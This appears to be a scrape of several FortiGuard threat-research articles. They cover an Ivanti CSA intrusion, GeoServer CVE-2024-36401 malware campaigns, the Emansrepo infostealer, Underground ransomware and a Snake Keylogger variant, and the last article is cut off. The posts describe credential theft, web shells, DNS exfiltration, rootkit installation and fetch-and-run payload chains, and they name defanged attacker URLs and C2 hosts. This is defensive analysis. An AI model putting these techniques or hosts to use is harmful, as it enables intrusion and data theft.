functionhandleDateTimeSubmit(&$msg). This function is responsible for handling change submissions when the “Save” button is clicked, as depicted in the screenshot below. The value of a global variable, $TIMEZONE, which was passed as a variable to the functionsetPhpTimeZone, was received from the POST request variableTIMEZONE. This implies that the threat actor crafted and sent a malicious POST request toDateTimeTab.php, with the malicious command passed in the POST request variableTIMEZONE. Going back to the malicious command injected by the threat actor, FGIR decoded the base64 blob, which resulted in the following Python code: The script extracts the password of the usergsbadminfrom the file/opt/landesk/broker/broker.confand assigns its value to the environment variablePGPASSWORD. The code targets the latest backup file in the/backupsdirectory and iterates through this directory to find the latest backup file. If it finds one, then it connects to the Postgres database using thegsbadmincredentials, extracts the password of the useradminfrom the tableuser_info,and assigns it to the environment variablePGPASSWORD. The script then decompresses the latest backup file, and then iterates through the files to search for a filename that satisfies the regular expressionphp\\w{6}, basically looking for a filename containing the stringphpfollowed by six characters (letters or numbers only). In case it finds such a file, it changes the permissions of the file so thateveryonehas the right to read, write, and execute it. The script then reads the private key from the backup file of the userroot, encodes it using base64, and then assigns the resultant value to the columnorganizationin the Postgres database table,user_info. While assessing the backend Postgres database logs, FGIR found confirmation of successful exploitation of this command injection vulnerability, as seen in the screenshot below: Once the threat actor extracted the credentials of the usersgsbadmin, admin, and the private key of the userroot,they used the stolen credentials to perform authenticated exploitation of the publicly unknown command injection vulnerability affecting the resource/gsb/reports.php. Some of the threat actor requests can be seen in the messages and audit logs below: Command injection was found to be exploited in the following format, where a php script/subin/tripwirewas executed with the parameter–update,followed by a semicolon and a malicious command. The first malicious command injected by the threat actor was used to create a web shell calledhelp.phpin the CSA webroot folder under the/gsbdirectory. FGIR looked at the code of the resourcereports.phpand identified the vulnerability in the line highlighted below in yellow. The script accepts the value of the POST parameterTW_IDand passes it as a parameter to the script/subin/tripwire, without sanitization. The resource/sbin/tripwireis a PHP wrapper for the binary/usr/sbin/tripwire, which is used to create security reports, when initiated through the gsb/reports.phpresource. This is a legitimate functionality of the Ivanti CSA portal. FGIR inspected the tripwire PHP wrapper script and found the functionupdatewhich passes the command directly to the installed tripwire binary without sanitization. Since the tripwire PHP wrapper runs withsudoprivileges, the injected command also runs with elevated privileges. FGIR acquired the patch for CVE-2024-8190, and while analyzing the functionality of the patch, FGIR assessed that the file,reports.phpwas not in the patch script, nor was it listed as a file in the patch folder, leading FGIR to conclude that the command injection vulnerability found in the resource/gsb/reports.phpwas not addressed in that patch. On September 10, 2024, when the advisory for CVE-2024-8190 was published by Ivanti, the threat actor, still active in the customer’s network, “patched” the command injection vulnerabilities in the resources/gsb/DateTimeTab.php, and/gsb/reports.php, making them unexploitable. In the past, threat actors have been observed to patch vulnerabilities after having exploited them, and gained foothold into the victim’s network, to stop any other intruder from gaining access to the vulnerable asset(s), and potentially interfering with their attack operations. In this case, the threat actor downloaded the patched version of the two vulnerable resources fromtemp[.]shand saved them as/tmp/1on disk, before moving them to the webroot folder and overwriting the vulnerable version of the files with them. Below are the relevant commands: The modified timestamps of the resourcesreports.php, andDateTimeTab.phpwere September 10, 2024, at 12:37:23 UTC and 13:06:10 UTC, respectively, as seen in the screenshots below. Comparing the original vulnerable version ofreports.phpto the version patched by the threat actor, shows that the threat actor added a piece of code to replace the semicolon with an underscore in the POST parameterTW_ID, so that command injection using the semicolon is not possible anymore. FGIR tested the patching in a lab environment and confirmed that the modification by the threat actor does indeed make the resourcereports.phpunexploitable after the patch. The screenshot below shows the directorytestwithoutfixwas successfully created by exploiting the command injection vulnerability on the original vulnerable version ofreports.php. When the fix is applied to thereports.phpfile and the command injection is exploited again, the directorytestwithfixis not created. The threat actor also patched the fileDateTimeTab.phpusing the samestr_replacefunction to replace any semicolon in the POST parameterTIMEZONE, with an underscore, rendering the command injection vulnerability using this parameter ineffective. After compromising the internet-facing Ivanti CSA appliance, the threat actor exploited the CVE-2024-29824 SQL Injection vulnerability on Ivanti’s backend SQL database server (SQLS). Sample malicious POST requests exploiting this vulnerability are depicted below. The threat actor enabled thexp_cmdshellstored procedure via the exploitation and used this stored procedure to attain remote code execution on the SQLS system. The threat actor created an account calledmssqlsvcon the compromised system SQLS and turned off the host firewall. FGIR also observed that the threat actor ran some basic reconnaissance commands on theSQLSsystem and attempted to exfiltrate the reconnaissance output using the following PowerShell command: This is a technique used to exfiltrate data over the DNS protocol. The technique is also known asDNS tunneling. See below for the content of the file that the threat actor tried to exfiltrate: FGIR discovered more tactics and techniques used by the threat actor during their intrusion. FGIR extracted and decoded some interesting commands executed by the threat actor from the Linux audit logs and other sources. A sample of those commands are shown in the table below: During the course of their operations, the threat actor created several webshells. They also modified the legitimate resource,syslog.php,and appended malicious code to it, to use it as a web shell. Some of the web shells found are shown in the table below. On September 11, at 04:12:00 UTC, the threat actor started an authentication brute force attack against the customer’s internal network assets, using a dictionary attack. FGIR discovered that the threat actor downloaded a tar file calledufrom atemp[.]shURL. This tar file contained three files:brokes, passdic.txt, andu.txt. The filebrokesis a Linux ELF binary, which was used to perform the brute force attack on customer’s network assets. It is likely thatbrokesused as parameters the list of customer’s users, possibly harvested during a different campaign, in the form of the fileu.txtand the password filepassdic.txt. The threat actor downloaded an unknown file calledtargetfromtemp[.]sh, however this one was not found on the disk. The threat actor also downloaded a shell script calleds.sh, from thetemp[.]shsite. This script was used to execute thebruteforcebinarybrokesand anonymous logins were attempted on LDAP’s port TCP 389 of the attacked assets with several passwords. During the memory analysis of the CSA appliance, FGIR discovered traces of the use of an open-source go-based proxy tool calledReverseSocks5, which was downloaded and used by the threat actor to perform scanning and brute force attacks on the customer’s internal network, while proxying the traffic through the CSA appliance. The string, which was created in the memory due to an error thrown by the tool, can be seen in the below snippet. Some other suspicious strings found during the analysis of the memory included some PHP variables found to be populated with suspicious values: ZjmgmXsB.phpwas a webshell, which the threat actor was interacting with, while accessing it from the IP address208[.]105[.]190[.]170. During the investigation, FGIR discovered that on September 7, 2024, at 03:26:17 UTC, the threat actor attempted to deploy a rootkit in the form of a Linux kernel object (KO) module on the CSA appliance. This attempt was found in the audit logs as seen in the snippet below: The likely motive behind this was for the threat actor to maintain kernel-level persistence on the CSA device, which may survive even a factory reset. This activity is in line with the public reporting on the compromise of Ivanti CSA appliances, which is availablehereandhere. FGIR decoded the hex string contained in the snippet above and obtained a base64 encoded blob. The initial part of the resultant base64 encoded blob indicates that this is a compressed archive file. Decompressing the tar file results in the following two files. The fileinstall.shis a malicious bash script that installs a malicious kernel object calledsysinitd.ko. The compressed archive file was corrupted and only the fileinstall.shcould be retrieved successfully in its entirety, while the filesysinitdwas truncated, and the filesysinitd.kowas missing. FGIR pivoted to the disk image of the CSA appliance and found thesysinitdandsysinitd.kofiles in the location/usr/share/empty/init/. The scriptinstall.shwas meant to install the malicious rootkitsysinitd.koon the affected system. The following variables were hard-coded in the scriptinstall.sh: The script starts with the following function call, which reads two parameters: The first parameter is the INSTALL_NAME string, which is used to rename the two files sysinitd andsysinitd.koto INSTALL_NAME and INSTALL_NAME.ko respectively. The second parameter is the path where the script copies the renamed version ofsysinitdandsysinitd.koto. In this case, the threat actor did not supply either of the two parameters. Therefore, the default namessysinitdandsysinitd.kowere used by the script. The following snippet of code checks if the install path exists and if not, then it creates it: The script then removes any installed kernel object with the name INSTALL_NAME.ko, using the commandrmmod, and then installs the malicious INSTALL_NAME.ko using the commandinsmod. The bash scriptinstall.shinstalls a persistence mechanism using the technique of adding an entry to install the malicious kernel object in therc.localandrc.d/rc.localfiles, if the malicious kernel object file is present on disk. FGIR aims to analyze the rootkit in detail and publish the findings in a follow-up blog post. The advanced adversaries were observed exploiting and chaining zero-day vulnerabilities to establish beachhead access in the victim’s network.

    "content": "FortiGuard Labs Threat Research Affected Platforms:GeoServer prior to versions 2.23.6, 2.24.4, and 2.25.2Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical GeoServer is anopen-source softwareserver written in Java that allows users to share and edit geospatial data. It is the reference implementation of the Open Geospatial Consortium (OGC) Web Feature Service (WFS) and Web Coverage Service (WCS) standards. On July 1, the project maintainers released anadvisoryfor the vulnerabilityCVE-2024-36401(CVSS score: 9.8). Multiple OGC request parameters allow remote code execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The shortcoming has beenaddressedin versions 2.23.6, 2.24.4, and 2.25.2. On July 15, the U.S. Cybersecurity and Infrastructure Security Agency (CISA)addeda critical security flaw impacting OSGeo GeoServer GeoTools to its Known Exploited Vulnerabilities (KEV) catalog based on evidence of active exploitation. FortiGuard Labs added theIPS signaturethe next day and has observed multiple campaigns targeting this vulnerability to spread malware. The botnet family and miner groups strike the attack immediately. We also collect sidewalk backdoors, and GOREVERSE tries to exploit this vulnerability and set a connection with a command and control server (C2) to execute malicious actions. In this article, we will explore the details of the payload and malware. The payload retrieves a script from “hxxp://181[.]214[.]58[.]14:61231/remote.sh.” The script file first verifies the victim’s operating system and architecture to download the appropriate file, which it saves as “download_file.” It accommodates various OS types, including Linux, FreeBSD, Illumos, NetBSD, OpenBSD, and Solaris. After execution, it deletes the file to remove traces of its activity. The ultimate executable is “GOREVERSE,\" packed with UPX. GOREVERSE is a malicious tool that often functions as areverse proxy server, allowing attackers to illicitly access target systems or data. Once executed, the connection is made to a specific IP address (181[.]214[.]58[.]14) and port (18201), which is not a standard SSH port. From the exploitation packet of CVE-2024-36401, we observed threat actors attempting to access IT service providers in India, technology companies in the U.S., government entities in Belgium, and telecommunications companies in Thailand and Brazil. The attacker fetches the script from “hxxp://1[.]download765[.]online/d.” This batch file facilitates the download of execution files. All the ELF files on the remote server, known as the “SideWalk” malware, are designed to operate on ARM, MIPS, and X86 architectures. SideWalk is a sophisticated Linux backdoor malware also often linked with the hacking groupAPT41. First, SideWalk creates a folder named with a randomly generated string in the TMP directory. It then decodes two library files, libc.so.0 and ld-uClibc.so.1, along with the next-stage payload using the XOR key 0xCC. These decoded files are then stored in the previously created folder in the TMP path. Then, it also uses XOR to decode the string data using the key 0x89. It then executes the next stage payload, “ych7s5vvbb669ab8a.” It has three main functions: 1. Decrypt configuration: The configuration is decrypted using the ChaCha20 algorithm. The binary input contains a 16-byte MD5 hash, a 12-byte nonce for ChaCha20 decryption, and a 4-byte section indicating the length of the ciphertext, followed by the actual ciphertext. Based on the assembly code, the decryption key is hard-coded as “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” and the decryption process runs 15 rounds (0xF). After successful decryption, the extracted C2 is secure[.]systemupdatecdn[.]de (47[.]253[.]46[.]11), listening on port 80, with the mutex name “hfdmzbtu.” 2. Establish C2 communication: Communication with the C2 server is established using an encrypted session, also based on the ChaCha20 algorithm. The packet structure comprises a 4-byte section representing the packet length, a 12-byte nonce for ChaCha20 decryption, 20 bytes of message metadata, and the final ciphertext. The initial exchange includes keys (v-key and s-key) for subsequent message encryption. In early packets, the original key, “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” decrypts the message metadata, while the exchanged keys (v-key and s-key) decrypt the ciphertext. In packet 5, the victim’s information (computer name, operating system, and system time) is transmitted. 3. Execute the command issued by C2: In this attack scenario, we find a Plugin namedFast Reverse Proxy(FRP.) Fast Reverse Proxy (FRP) is a legitimate and widely-used tool that complicates the detection of malicious network traffic by blending it with normal traffic, thereby enhancing the stealthiness of cyberattacks. Because it is open source, this tool has been leveraged in the past by several threat actors, such asMagic Hound,Fox Kitten, andVolt Typhoon. Using FRP, attackers create an encrypted tunnel from an internally compromised machine to an external server under their control. This method enables them to maintain a foothold within compromised environments, exfiltrate sensitive data, deploy further malicious payloads, or execute other operations. In this attack case, SideWalk also downloads a customized configuration file that directs the connection to a remote server (47[.]253[.]83[.]86) via port 443, further enhancing the attacker's control and persistence. Analysis of the script download URL's telemetry reveals a concentrated pattern of infections. The primary targets appear to be distributed across three main regions: South America, Europe, and Asia. This geographical spread suggests a sophisticated and far-reaching attack campaign, potentially exploiting vulnerabilities common to these diverse markets or targeting specific industries prevalent in these areas. This script downloads and executes a file named “sky” from a specified URL, “hxxp://188[.]214[.]27[.]50:4782. “ It changes its permissions to make it executable, runs it with the parameter “geo,” and then deletes the file. The configuration data is extracted by XORing the file contents with 0x3A. This enabled us to find information like “bots[.]gxz[.]me,” which is the C2 server the malware attempts to connect to. When executing the malware, a string shows up. This malware has a credential list for brute-force attacks and a hard-coded payload related to the Huawei router vulnerability CVE-2017-17215. The payload attempts to download malware from 59[.]59[.]59[.]59. The attacker first terminates several processes (mpsl, mipsel, bash.mpsl, mips, x86_64, x86), then downloads and executes multiple bot binaries for different CPU architectures (such as ARM, MIPS, PPC, X86, M68K, SH4, and MPSL) from a remote server, “hxxp://209[.]146[.]124[.]181:8030.” The binaries are fetched using wget, saved in the /tmp directory, made executable (chmod 777), and executed. The following section uses “bot.arm7” as an example. The malware can be recognized by the specified string “condi.” Executing the malware sends numerous DNS queries to “trcpay[.]xyz.” The Condi botnet first tries to resolve the C2 server address and its function. It then establishes a connection with the C2 server and waits to parse the command. The malware has numerous DDoS attack methods, such as TCP flooding, UDP flooding, and a VSE DDoS attack. In tracing the connection back to the remote server, “hxxp://209[.]146[.]124[.]181:8030,” we found that it was built as an HFS (HTTP File Server) and that two malicious tools—“Linux2.4” (another botnet) and “taskhost.exe” (the agent tool)—are located in the server. The botnet “Linux2.4” not only has different methods that can trigger a DDoS attack but can also act as a backdoor agent. The tool first connects to a server, which is the same as the remote server “209[.]146[.]124[.]181.” It then gathers the host information. Later, it waits for the command to either conduct a remote command execution or trigger a DDoS attack. The Backdoor malware “taskhost.exe” is designed especially for Windows. It creates a service named “9jzf5” for persistence and then creates different process types to retrieve information from attackers lurking in the host. We found four types of incident coin miners that can be delivered to victim hosts, as shown in the following details. The attacker downloads a script from a remote URL “hxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860[.]txt/test.sh” and saves it as script.sh in the temp folder. The payload within the incident packets then modifies and executes the script to achieve various purposes. The script first gathers host information, such as the location of Aegis, the distribution version of Linux. Afterward, it attempts to uninstall different cloud platforms, like Tencent Cloud, Oracle, Kingsoft Cloud, JD Cloud, and Ali Cloud, to evade monitoring agents from those cloud services. A noteworthy point is that the comments in the script are written in simplified Chinese, indicating that the miner campaign/author may be affiliated with a Chinese group. While finishing these uninstalls, the script kills some security defense mechanisms processes and checks whether the current user has the root privilege needed to uninstall those mechanisms. If everything executes successfully, the script downloads the coin miner and creates another script for persistence. The coin miner, named “sshd,” wrote the configuration within itself. The miner points to two target pools: “sdfasdfsf[.]9527527[.]xyz:3333” and “gsdasdfadfs[.]9527527[.]xyz:3333.” Another type of coin miner attack begins with the Base64-encoded command. It intends to download “linux.sh” from “hxxp://repositorylinux.com.” The comment in “linux.sh” is written in Sundanese, an Indonesian language. The script downloads two files: a coin miner named “linuxsys“ and a related configuration file named “config.json.” It downloads these through an AWS (Amazon Web Service) cloud platform service the attacker holds. The coin miner sets the pool URL “pool[.]supportxmr[.]com:80” with credentials using “config.json.” The miner itself is XMRig, which can be recognized through its data. The action sent via four packets is to download “/tmp/MmkfszDi” from the remote server “hxxp://95[.]85[.]93[.]196:80/asdfakjg.sh,” make it executable, and then run it. The script downloads a coin miner like the others mentioned before. It also removes a list of files within “/tmp,” “/var,” \"/usr,\" and “/opt.” The coin miner named “h4” is similar to the other two types mentioned. It is XMRig as well and embeds its configuration within the binary file. The miner sets the pool URL as “asdfghjk[.]youdontcare[.]com:81” The last type of coin miner incident command is also encoded with base64. It downloads “cron.sh” from “112[.]133[.]194[.]254.” This fraudulent site mimics the webpage of the Institute of Chartered Accountants of India (ICAI). The site is currently removed. “cron.sh” uses the job scheduler on the Unix-like operating system “cron,” as its name indicates. The script schedules jobs for things like downloading coin miner-related scripts and setting the scripts into “crontab.” It first downloads the script named “check.sh” from the same source IP “112[.]133[.]194[.]254” and executes the script. “check.sh” first creates the necessary directories and confirms that the victim host hasn’t been infected. Once the script finds that the victim host is the first to be infected, it downloads “config.sh” from the attacker’s IP “112[.]133[.]194[.]254” and the XMRig coin miner from the developer platform “Github.” Through “config.sh,” we learned that the attacker set the pool on SupportXMR “pool[.]supportxmr[.]com:3333” While GeoServer’s open-source nature offers flexibility and customization, it also necessitates vigilant security practices to address its vulnerabilities. The developer patched the vulnerability with the function “JXPathUtils.newSafeContext” instead of the original vulnerable one to evaluate the XPath expression safety. However, implementing comprehensive cybersecurity measures—such as regularly updating software, employing threat detection tools, and enforcing strict access controls—can significantly mitigate these risks. By proactively addressing these threats, organizations can secure their environments and ensure the protection and reliability of these data infrastructures.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In August 2024, FortiGuard Labs observed a python infostealer we call Emansrepo that is distributed via emails that include fake purchase orders and invoices. Emansrepo compresses data from the victim’s browsers and files in specific paths into a zip file and sends it to the attacker’s email. According to our research, this campaign has been ongoing since November 2023. The attacker sent a phishing mail containing an HTML file, which was redirected to the download link for Emansrepo. This variant is packaged by PyInstaller so it can run on a computer without Python. As time goes by, the attack flow has become increasingly complex. Below are the attack flows we found in July and August 2024: Various stages are being added to the attack flow before downloading Emansrepo, and multiple mailboxes are used to receive different kinds of stolen data. This article will provide a detailed analysis of each attack chain and its behavior. We will then provide a quick summary of the next campaign. The attachment is a dropper that mimics a download page. It creates a link element that points to the data of Purchase-Order.7z and uses the click() method to “download” Purchase-Order.7z. Six seconds later, it redirects to a completely unrelated website. Purchase-Order.exe, the file embedded in Purchase-Order.7z, is an AutoIt-compiled executable. It doesn’t include any files, and the AutoIt script determines its behavior. The script has many unused functions, frustrating its analysis. The only meaningful code downloads preoffice.zip to the Temp folder and unzips it into % TEMP%\\PythonTemp. The zip archive contains necessary Python modules and tester.py, the malicious script for information stealing. The innermost file in P.O.7z is an HTA file. Its source file is a JavaScript file that shows a hidden window named PowerShell Script Runner and downloads the PowerShell script, script.ps1, with VBScript for the next stage. The behavior of script.ps1 is similar to the AutoIt script in chain 1. It downloads preoffice.zip to the Temp folder and unzips it to %TEMP%\\PythonTemp, but it executes Emansrepo using run.bat. The 7z file from the link in the phishing mail contains a batch file obfuscated by BatchShield. After deobfuscation, we can see that it is not as complicated as it first seems. It simply downloads and executes script.ps1 using PowerShell. According to the email receiving the data, the infostealer behavior can be divided into three parts. It creates folders to temporarily store the stolen data for each part and deletes them after sending the data to the attacker. The stolen data is attached to the email sent to the attacker. In part 1, the Python stealer collects login data, credit card information, web history, download history, autofill, and text files (less than 0.2 MB) from the Desktop, Document, and Downloads folders.

It’s worth noting thatemans841 reporthas been used as the divider in Saved_Passwords.txt since the December 2023 variant (ae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a). Because of this, we call it Emansrepo. The variant used in November 2023 usesPrysmax Premiumas the divider. By comparing the variant in November 2023 with the first edition of the Prysmax stealer shared on GitHub, we find they contain many similar functions, though the Emansrepo stealer had fewer features. However, as parts 2 and 3 were added to Emansrepo, it has become quite different from the Prysmax stealer. Part 2 copies PDF files (less than 0.1 MB) from the Desktop, Document, Downloads, and Recents folders and compresses folders of browser extensions, crypto wallets, and game platforms into zip files.

As the above screenshot shows, these attacks have the same content but use different methods to distribute malware. The attack flow for Remcos is much simpler. The attacker just sends phishing emails with a malicious attachment. The attachment is a DBatLoader, which downloads and decrypts data for the payload. The payload is a Remcos protected by a packer. Emansrepo has been active since at least last November, and the attack method is continuously evolving. The attack vectors and malware are ever-changing and pervasive, so it’s vital for organizations to maintain cybersecurity awareness. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W32/Kryptik.EB!trJS/Agent.FEI!trBAT/Downloader.2C22!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Underground ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The first sample of Underground ransomware was first observed in early July 2023, on a publicly available file scanning site. This roughly coincides with the timing of the first victim posted on its data leak site on July 13, 2023. Like most ransomware, this ransomware encrypts files on victims' Windows machines and demands a ransom to decrypt them via dropped ransom notes. Online reports indicate that the Russia-based RomCom group, also known as Storm-0978, is deploying the Underground ransomware. This threat group is known to exploit CVE-2023-36884 (Microsoft Office and Windows HTML RCE Vulnerability), which could be the infection vector for the ransomware. FortiGuard Labs published an Outbreak Alert on CVE-2023-36884 on July 13, 2024. The group may also use other common infection vectors such as email and purchasing access from an Initial Access Broker (IAB). Once executed, the Underground ransomware deletes shadow copies with the following command: The ransomware sets the maximum time that a RemoteDesktop/TerminalServer session can remain active on the server to 14 days (14 days after the user disconnects) using the following command: It then stops the MS SQL Server service with the following command: The ransomware then creates and drops a ransom note named “!!readme!!!.txt”: While the ransomware encrypts files, it does not change or append file extensions. It also avoids encrypting files with the following extensions: .sys .exe .dll .bat .bin .cmd .com .cpl .gadget .inf1 .ins .inx .isu .job .jse .lnk .msc .msi .mst .paf .pif .ps1 .reg .rgs .scr .sct .shb shs .u3p .vb .vbe .vbs .vbscript .ws .wsh .wsf The ransomware creates and executes temp.cmd, which performs the following actions: The Underground ransomware has a data leak site that posts victim information, including data stolen from victims. Currently, the data leak site lists 16 victims, with the most recent victim posted on July 3, 2024. Below is a breakdown of the victims and their verticals: Post Date Location of Victim Vertical 2024/07/03 USA Construction 2024/07/01 France Pharmaceuticals 2024/06/17 USA Professional Services 2024/05/27 USA Banking 2024/05/15 USA Medicine 2024/05/01 USA Industry 2024/04/09 USA Business Services 2024/04/09 USA Construction 2024/03/25 USA Manufacturing 2024/03/06 Korea Manufacturing 2024/02/12 Spain Manufacturing 2024/02/02 Germany Industry 2023/07/31 Slovakia Business Services 2024/07/18 Taiwan Industry 2024/07/18 Singapore Manufacturing 2024/07/14 Canada Manufacturing The data leak site also includes a drop-down box with a list of industries that the ransomware group is targeting or is allowed to target. The Underground ransomware group also has a Telegram channel that was created on March 21, 2024. According to the Telegram channel, the ransomware group has made victims' stolen information available on Mega, a cloud storage service provider that is being abused. The Underground ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Please read the outbreak alert for protection against the potential infection vector (CVE-2023-36884) abused by the Underground ransomware: Underground Ransomware File IOCs SHA2 Note 9543f71d7c4e394223c9d41ccef71541e1f1eb0cc76e8fa0f632b8365069af64 Underground ransomware 9f702b94a86558df87de316611d9f1bfe99a6d8da9fa9b3d7bb125a12f9ad11f eb8ed3b94fa978b27a02754d4f41ffc95ed95b9e62afb492015d0eb25f89956f 9d41b2f7c07110fb855c62b5e7e330a597860916599e73dd3505694fd1bbe163 cc80c74a3592374341324d607d877dcf564d326a1354f3f2a4af58030e716813 d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts.

The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "title": "Deep Analysis of Snake Keylogger’s New Variant",
    "link": "https://www.fortinet.com/blog/threat-research/deep-analysis-of-snake-keylogger-new-variant",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from the victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently caught a phishing campaign in the wild with a malicious Excel document attached to the phishing email. We performed a deep analysis on the campaign and discovered that it delivers a new variant of Snake Keylogger. Snake Keylogger (aka “404 Keylogger” or “KrakenKeylogger”) is a subscription-based keylogger with many capabilities. It is a .NET-based software originally sold on a hacker forum. Once executed on a victim’s computer, it has the ability to steal sensitive data, including saved credentials from web browsers and other popular software, the system clipboard, and basic device information. It can also log keystrokes and capture screenshots. In the following sections, we will look at the phishing spam, how it lures the recipient into opening a malicious Excel document, how the Excel document downloads and executes a new variant of Snake Keylogger, and what anti-analysis techniques it uses to protect itself from being detected and blocked during the attack. The email content in Figure 1 attempts to deceive the recipient into opening the attached Excel file (swift copy.xls) by claiming that funds have been transferred into their account. To warn the user, the FortiGuard service marks this phishing email as “[virus detected],” as shown in the subject line. Figure 2 shows the content of the attached Excel file when opened in the Office Excel program. Meanwhile, malicious code is executed in the background to download other files. Looking into the binary data of the Excel file, it contains a specially crafted embedded link object that exploits theCVE-2017-0199vulnerability to download a malicious file. Figure 3 displays the embedded link object (“\\x01Ole”). The link is “hxxp[:]//urlty[.]co/byPCO,” which is secretly requested by the Excel program when the file is opened. When the link is accessed, it returns with another URL in the “Location” field of the response header, which is “hxxp[:]//192.3.176[.]138/xampp/zoom/107.hta”.  HTA file is an HTML Application file executed by a Windows application— by default, the HTML Application host (mshta.exe). The 107.hta file is full of obfuscated JavaScript code that is executed automatically when loaded by mshta.exe. Figure 4 shows a partial view of the JavaScript code. After decoding and de-obfuscating the JavaScript code, we were able to get a piece of the VBScript code, as shown in Figure 5. It’s evident that the VBScript code created an object of “Script.Shell” and executed a piece of PowerShell code decoded from a base64 string, defined in the variable “ps_code”. This PowerShell code is then executed by “cmd.exe” (%ComSpec%) when the “shellObj.Run()” function is called. The base64 decoded PowerShell code is shown below. It invokes a Windows API, URLDownloadToFile(), to download an executable file to the victim’s computer and run it after waiting three seconds. The URL of the executable file is hardcoded as “hxxp[:]//192.3.176[.]138/107/sahost.exe” and the local file is “%Appdata%\\sahost.exe”. The PowerShell code finally starts the executable file by callingStart “$Env:AppData\\sahost.exe”. My research shows that the downloaded EXE file (sahost.exe) contains a new variant of Snake Keylogger, which is extracted, decrypted, loaded, and run by the EXE file. I will refer to this downloaded EXE file as the Loader module. Figure 6 is a screenshot of its analysis in a packer detection tool. It was developed using the Microsoft .Net Framework. To protect the Snake Keylogger core module from being detected and blocked by cybersecurity products, sahost.exe uses multiple-layer protection techniques, like transformation and encryption, within several named resources. When sahost.exe starts, it extracts several modules (dlls) onto its memory from the Resource section that provide methods to inquire, extract, decrypt, install, and deploy the core module. The original name of “sahost.exe” is “utGw.exe.” It decrypts and extracts a module called “FGMaker.dll” from a resource named “siri” in its Resource section. Figure 7 shows some of that code. The “FGMaker.dll” module extracts additional modules (such as “Q” and “Gammar.dll”) that work together to extract and decrypt a module called “Tyrone.dll” from the resource “KKki”. You may have noticed in Figure 8 that it loads “KKki” as a Bitmap resource. The module “Tyrone.dll” was encrypted, broken down into bytes, and kept in the Bitmap resource. Figure 9 shows the content of the resource “KKki” as a Bitmap picture. After another decryption sequence, we can see the plaintext of the “Tyrone.dll” module in memory. It is then loaded as an executable module by calling the Assembly.Load() method. Figure 10 showcases the modules that have been extracted and loaded by the Loader module so far. I will refer to “Tyrone.dll” as “Deploy module” in the following analysis. It performs the following functions: This checks whether the current process’s full path is \"% AppData%WeENKtk.exe,\" renames it, and sets attributes (Hidden, ReadOnly, System, etc.) to it if the result is no. On the very first run, it was %AppData%sahost. exe. The Deploy module runs the “schetasks.exe” command to create a new scheduled task in the system Task Scheduler. This allows Snake Keylogger to launch at system startup. Figure 11 shows the scheduled task for Snake Keylogger. The Deploy module obtains a resource data, “I7O14IyvsdO,” from its own Resource section. Then, it decrypts the data with the string key “YRDdITlYRXI” into a final PE file in its memory. This is the core module of Snake Keylogger. Next, the 